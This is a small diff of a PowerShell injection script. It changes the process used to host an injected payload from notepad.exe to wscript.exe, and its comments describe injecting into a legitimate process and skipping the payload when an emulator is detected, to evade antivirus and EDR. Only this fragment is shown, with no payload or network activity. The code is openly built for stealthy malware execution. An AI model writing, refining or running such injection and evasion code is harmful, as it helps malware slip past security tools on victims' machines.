@@ -146,7 +146,7 @@ function inject {
 
 # Inject to explorer or start a legitimate process that will run the payload
 #$procId = (Get-Process explorer).Id
-$procId = (Start-Process -FilePath C:\\Windows\\System32\\notepad.exe -PassThru).Id
+$procId = (Start-Process -FilePath C:\\Windows\\System32\\wscript.exe -PassThru).Id
 
 # AV/EDR Evasions if fails the program will not execute the payload
 if (IsEmulator) { return }
